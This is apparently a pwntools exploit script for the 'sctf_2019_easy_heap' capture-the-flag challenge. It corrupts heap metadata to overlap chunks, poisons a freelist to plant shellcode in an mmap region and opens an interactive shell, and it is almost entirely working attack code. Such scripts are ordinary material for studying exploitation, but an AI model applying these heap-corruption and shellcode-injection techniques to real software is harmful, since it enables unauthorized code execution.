from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


# io=remote("node4.buuoj.cn",27185)
io=process("./sctf_2019_easy_heap")
elf=ELF("./sctf_2019_easy_heap")

def alloc(n):
    io.sendlineafter(b">> ",b"1")
    io.sendlineafter(b"Size: ",str(n))

def delete(n):
    io.sendlineafter(b">> ",b"2")
    io.sendlineafter(b"Index: ",str(n))

def fill(n,c):
    io.sendlineafter(b">> ",b"3")
    io.sendlineafter(b"Index: ",str(n))
    io.sendafter(b"Content: ",c)

io.recvuntil(b"Mmap: ")
mmap=int(io.recv(12),16)
print("mmap: "+hex(mmap))

alloc(0x420) #0

alloc(0x38) #1
alloc(0x28) #2
alloc(0x4f0) #3
alloc(0x10) #4



delete(0)
payload=cyclic(0x20)+p64(0x4a0)
fill(2,payload)


gdb.attach(io)
pause()

delete(3)
delete(1)
delete(2)

alloc(0x460) #0
alloc(0x520) #1
payload=cyclic(0x420)+p64(0)+p64(0x41)+p64(mmap)
fill(0,payload+b"\n")

alloc(0x38) #2
alloc(0x38) #3

payload=asm(shellcraft.sh())
fill(3,payload+b"\n")


fill(1,b"\x30\n")
alloc(0x28) #5
alloc(0x28) #6
payload=p64(mmap)
fill(6,payload+b"\n")


io.sendlineafter(b">> ",b"1")
io.sendlineafter(b"Size: ",b"1")
print("asd  "+hex(mmap))

io.interactive()